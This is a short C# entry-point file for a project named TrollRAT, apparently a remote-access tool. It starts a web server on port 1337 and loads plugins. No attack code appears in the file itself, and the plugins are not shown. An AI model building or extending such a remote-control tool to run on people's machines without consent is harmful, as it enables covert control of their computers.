using System;

using TrollRAT.Server;
using TrollRAT.Plugins;

namespace TrollRAT
{
    public static class TrollRAT
    {
        private static WebServer server;
        public static WebServer Server => server;

        internal static PluginManager pluginManager;

        [STAThread]
        static void Main()
        {
            server = new WebServer(1337);

            pluginManager = new Plugins.PluginManager();
            pluginManager.loadPlugins();

            server.run();
        }
    }
}
